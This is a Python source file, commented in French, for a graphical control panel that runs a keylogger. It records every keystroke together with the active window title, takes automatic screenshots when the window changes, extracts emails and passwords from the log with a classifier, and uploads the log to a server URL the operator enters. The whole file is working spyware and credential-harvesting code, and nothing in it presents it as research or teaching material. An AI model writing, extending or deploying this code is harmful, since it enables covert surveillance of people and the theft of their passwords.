import ttkbootstrap as ttk
from ttkbootstrap.constants import *
import threading
import time
import os
from datetime import datetime
from tkinter import filedialog, StringVar, BooleanVar, W, E, LEFT, RIGHT, BOTH, YES, CENTER, END

# --- IMPORTS CRITIQUES ---
try:
    import requests
    from pynput import keyboard
    import pygetwindow as gw  # Nécessaire pour la détection des fenêtres
    
    # Imports de vos autres modules (assurez-vous qu'ils existent)
    from classifier import classify_text
    from screenshot import take_screenshot, get_active_window_info
    
except ImportError as e:
    print(f"Erreur d'importation : {e}")
    # On continue pour permettre à l'interface de s'afficher même si un module manque (pour debug)

# --- 1. VARIABLES GLOBALES ---
global_key_listener = None
keylogger_running = False
last_window_title = ""  # Variable critique pour suivre la fenêtre

screenshot_monitor_thread = None
screenshot_monitor_running = False


# --- 2. LOGIQUE DU KEYLOGGER ET DÉTECTION WINDOWS (INTÉGRÉE) ---

def get_active_window_title():
    """
    Récupère le titre de la fenêtre active avec précision.
    Intégré ici pour garantir que la GUI l'utilise correctement.
    """
    try:
        active_window = gw.getActiveWindow()

        # Si aucune fenêtre n'est active (souvent le bureau)
        if active_window is None:
            return "Desktop"

        title = active_window.title

        # Vérifications spécifiques OS
        if title == "Program Manager":  # Windows Desktop
            return "Desktop"
        elif title == "Finder": # macOS Desktop
            return "Desktop"
        elif not title.strip(): # Titre vide
             return "Desktop"
        else:
            return title
            
    except Exception:
        return "Desktop"

def on_press(key):
    """Fonction appelée à chaque frappe de touche."""
    global last_window_title
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Récupération du titre ACTUEL
    current_window_title = get_active_window_title()

    try:
        with open('keylog.txt', 'a', encoding='utf-8') as f:
            # Si la fenêtre a changé, on l'écrit dans le log
            if current_window_title != last_window_title:
                f.write(f'\n--- Window changed to: [{current_window_title}] at {timestamp} ---\n')
                last_window_title = current_window_title
                print(f"[DEBUG] Fenêtre détectée : {current_window_title}") # Debug console

            # Log de la touche
            if hasattr(key, 'char') and key.char:
                f.write(f'[{timestamp}] Key: {key.char}\n')
            else:
                f.write(f'[{timestamp}] Special: {key}\n')
                
    except Exception as e:
        print(f"Erreur écriture log: {e}")

def on_release(key):
    """Arrêt d'urgence avec ESC (optionnel dans la GUI mais utile)."""
    if key == keyboard.Key.esc:
        # Dans une GUI, on évite souvent que ESC tue le listener brutalement, 
        # mais on peut le laisser si vous le souhaitez.
        pass 

def start_keylogger_listener():
    """Démarre le Keylogger Pynput."""
    global global_key_listener, last_window_title
    
    # Réinitialiser pour forcer la détection de la fenêtre actuelle au démarrage
    last_window_title = "" 
    
    # Utilise les fonctions définies ci-dessus (locales)
    global_key_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    global_key_listener.start()


# --- 3. FONCTIONS DE CONTRÔLE GUI ---

def toggle_keylogger(status_var, button):
    global keylogger_running

    if not keylogger_running:
        try:
            start_keylogger_listener()
            keylogger_running = True
            status_var.set("Statut: Keylogger ACTIF (Enregistrement...)")
            button.config(text="Arrêter le Keylogger", bootstyle="danger-outline")
            print("Keylogger Démarré.")
        except Exception as e:
            status_var.set(f"Erreur Démarrage: {e}")
            print(f"Erreur start: {e}")
    else:
        if global_key_listener:
            global_key_listener.stop()
            
        keylogger_running = False
        status_var.set("Statut: Keylogger INACTIF")
        button.config(text="Démarrer le Keylogger", bootstyle="success-outline")
        print("Keylogger Arrêté.")

# --- 4. FONCTIONS SCREENSHOT (Reste inchangé) ---

def take_screenshot_now():
    try:
        take_screenshot()
        print("Capture manuelle effectuée.")
        ttk.dialogs.Messagebox.show_info("Succès", "Capture sauvegardée.")
    except Exception as e:
        print(f"Erreur capture: {e}")

def start_screenshot_monitor_logic():
    global screenshot_monitor_running
    last_window_info = None
    
    while screenshot_monitor_running:
        try:
            current_window_info = get_active_window_info()
            if current_window_info[0] is not None and current_window_info != last_window_info:
                print(f"Changement détecté : Capture...")
                take_screenshot()
                last_window_info = current_window_info
            time.sleep(1)
        except Exception as e:
            print(f"Erreur moniteur: {e}")
            break
    screenshot_monitor_running = False

def toggle_screenshot_monitor(var_auto_screenshot):
    global screenshot_monitor_thread, screenshot_monitor_running
    if var_auto_screenshot.get():
        if not screenshot_monitor_running:
            screenshot_monitor_running = True
            screenshot_monitor_thread = threading.Thread(target=start_screenshot_monitor_logic, daemon=True)
            screenshot_monitor_thread.start()
            print("Moniteur Capture: ON")
    else:
        screenshot_monitor_running = False
        print("Moniteur Capture: OFF")


# --- 5. FONCTIONS ANALYSE & ENVOI (Reste inchangé) ---

def run_classification(file_path, tree_emails, tree_passwords):
    # Nettoyage
    for i in tree_emails.get_children(): tree_emails.delete(i)
    for i in tree_passwords.get_children(): tree_passwords.delete(i)
        
    if not os.path.isfile(file_path):
        ttk.dialogs.Messagebox.show_error("Erreur", "Fichier introuvable.")
        return

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            text = f.read()
            
        result = classify_text(text)

        for item in result['emails']:
            tree_emails.insert('', END, values=(item['value'], item['count']))
        for item in result['passwords']:
            tree_passwords.insert('', END, values=(item['value'], item['count']))
            
        ttk.dialogs.Messagebox.show_info("Terminé", "Analyse terminée.")
    except Exception as e:
        print(f"Erreur classifier: {e}")

def send_logs_to_server(url, file_path, status_label, root_window):
    if not os.path.isfile(file_path):
        root_window.after(0, lambda: ttk.dialogs.Messagebox.show_error("Erreur", "Fichier log introuvable."))
        return
        
    def send_in_thread():
        status_label.set("Envoi en cours...")
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                data = f.read()
            response = requests.post(url, data={'log': data}, timeout=5)
            
            if response.status_code == 200:
                status_label.set("Statut: ✅ Envoyé")
            else:
                status_label.set(f"Statut: ⚠️ Erreur {response.status_code}")
        except Exception as e:
            status_label.set("Statut: ❌ Erreur connexion")
            print(e)

    threading.Thread(target=send_in_thread, daemon=True).start()

# --- 6. NAVIGATION & GUI SETUP ---

def show_frame(frame):
    frame.tkraise()
    
def set_nav_style(btn_list, active_btn):
    for btn in btn_list:
        if btn == active_btn:
            btn.config(bootstyle="primary-outline")
        else:
            btn.config(bootstyle="secondary-link")

def select_file_for_analysis(var):
    path = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All", "*.*")])
    if path: var.set(path)

def main_gui():
    app = ttk.Window(themename="darkly")
    app.title("Control Panel - Keylogger & Monitor")
    app.geometry("900x650")
    
    # Variables
    keylog_status_var = StringVar(value="Statut: Keylogger INACTIF")
    reqlog_status_var = StringVar(value="Envoi: En attente")
    url_var = StringVar(value="http://localhost:8000/logs")
    log_file_var = StringVar(value="keylog.txt")
    file_path_analysis_var = StringVar(value="keylog.txt") 
    var_auto_screenshot = BooleanVar(value=False)

    # Layout
    main_container = ttk.Frame(app)
    main_container.pack(fill=BOTH, expand=YES)
    
    # Sidebar
    sidebar = ttk.Frame(main_container, width=200, padding=15, bootstyle="dark")
    sidebar.pack(side=LEFT, fill=Y)
    ttk.Label(sidebar, text="MONITORING", font=('Helvetica', 14, 'bold'), bootstyle="primary").pack(pady=(10, 30))
    
    # Content Area
    content_container = ttk.Frame(main_container, padding=20)
    content_container.pack(side=RIGHT, fill=BOTH, expand=YES)
    content_container.grid_columnconfigure(0, weight=1)
    content_container.grid_rowconfigure(0, weight=1)

    frames = {}

    # --- FRAME CONTROL ---
    control_frame = ttk.Frame(content_container)
    control_frame.grid(row=0, column=0, sticky="nsew")
    frames['control'] = control_frame
    
    ttk.Label(control_frame, text="KEYLOGGER", font=('Helvetica', 18, 'bold'), bootstyle="primary").pack(anchor=W, pady=(0,10))
    ttk.Label(control_frame, textvariable=keylog_status_var, font=('Helvetica', 12)).pack(anchor=W, pady=5)
    
    btn_keylog = ttk.Button(control_frame, text="Démarrer le Keylogger", 
                            command=lambda: toggle_keylogger(keylog_status_var, btn_keylog), 
                            bootstyle="success-outline", width=30)
    btn_keylog.pack(anchor=W, pady=10)
    
    ttk.Separator(control_frame).pack(fill=X, pady=20)
    
    # Section Envoi
    ttk.Label(control_frame, text="SERVER UPLOAD", font=('Helvetica', 18, 'bold'), bootstyle="primary").pack(anchor=W, pady=(0,10))
    req_grid = ttk.Frame(control_frame)
    req_grid.pack(fill=X)
    req_grid.columnconfigure(1, weight=1)
    
    ttk.Label(req_grid, text="URL:").grid(row=0, column=0, sticky=W)
    ttk.Entry(req_grid, textvariable=url_var).grid(row=0, column=1, sticky=W+E, padx=5)
    
    ttk.Button(req_grid, text="Envoyer Logs", 
               command=lambda: send_logs_to_server(url_var.get(), log_file_var.get(), reqlog_status_var, app),
               bootstyle="warning").grid(row=2, column=1, sticky=E, pady=10)
    ttk.Label(req_grid, textvariable=reqlog_status_var).grid(row=2, column=0, sticky=W)

    # --- FRAME CAPTURE ---
    capture_frame = ttk.Frame(content_container)
    capture_frame.grid(row=0, column=0, sticky="nsew")
    frames['capture'] = capture_frame
    
    ttk.Label(capture_frame, text="SCREENSHOTS", font=('Helvetica', 18, 'bold'), bootstyle="primary").pack(anchor=W, pady=20)
    
    btn_man = ttk.Button(capture_frame, text="📸 Capture Immédiate", command=take_screenshot_now, bootstyle="info", width=30)
    btn_man.pack(anchor=W, pady=10)
    
    ttk.Checkbutton(capture_frame, text="Activer Surveillance Auto", variable=var_auto_screenshot, 
                    command=lambda: toggle_screenshot_monitor(var_auto_screenshot), bootstyle="success-round-toggle").pack(anchor=W, pady=20)

    # --- FRAME ANALYSIS ---
    analysis_frame = ttk.Frame(content_container)
    analysis_frame.grid(row=0, column=0, sticky="nsew")
    frames['analysis'] = analysis_frame
    
    ttk.Label(analysis_frame, text="ANALYSE LOGS", font=('Helvetica', 18, 'bold'), bootstyle="primary").pack(anchor=W, pady=20)
    
    af_ctrl = ttk.Frame(analysis_frame)
    af_ctrl.pack(fill=X)
    ttk.Entry(af_ctrl, textvariable=file_path_analysis_var, width=40).pack(side=LEFT, padx=5)
    ttk.Button(af_ctrl, text="...", command=lambda: select_file_for_analysis(file_path_analysis_var), width=3).pack(side=LEFT)
    ttk.Button(af_ctrl, text="Analyser", command=lambda: run_classification(file_path_analysis_var.get(), tree_emails, tree_passwords), bootstyle="info").pack(side=LEFT, padx=10)

    res_frame = ttk.Frame(analysis_frame)
    res_frame.pack(fill=BOTH, expand=YES, pady=10)
    
    # Treeviews
    f_email = ttk.Labelframe(res_frame, text="Emails")
    f_email.pack(side=LEFT, fill=BOTH, expand=YES, padx=5)
    tree_emails = ttk.Treeview(f_email, columns=('val','count'), show='headings')
    tree_emails.heading('val', text='Email'); tree_emails.heading('count', text='Nbr')
    tree_emails.pack(fill=BOTH, expand=YES)
    
    f_pass = ttk.Labelframe(res_frame, text="Mots de Passe")
    f_pass.pack(side=LEFT, fill=BOTH, expand=YES, padx=5)
    tree_passwords = ttk.Treeview(f_pass, columns=('val','count'), show='headings')
    tree_passwords.heading('val', text='Password'); tree_passwords.heading('count', text='Nbr')
    tree_passwords.pack(fill=BOTH, expand=YES)

    # --- NAV BUTTONS ---
    navs = []
    b1 = ttk.Button(sidebar, text="Contrôle", command=lambda: (show_frame(frames['control']), set_nav_style(navs, b1)))
    b1.pack(fill=X, pady=5); navs.append(b1)
    
    b2 = ttk.Button(sidebar, text="Capture", command=lambda: (show_frame(frames['capture']), set_nav_style(navs, b2)))
    b2.pack(fill=X, pady=5); navs.append(b2)
    
    b3 = ttk.Button(sidebar, text="Analyse", command=lambda: (show_frame(frames['analysis']), set_nav_style(navs, b3)))
    b3.pack(fill=X, pady=5); navs.append(b3)

    show_frame(frames['control'])
    set_nav_style(navs, b1)
    
    app.mainloop()

if __name__ == "__main__":
    main_gui()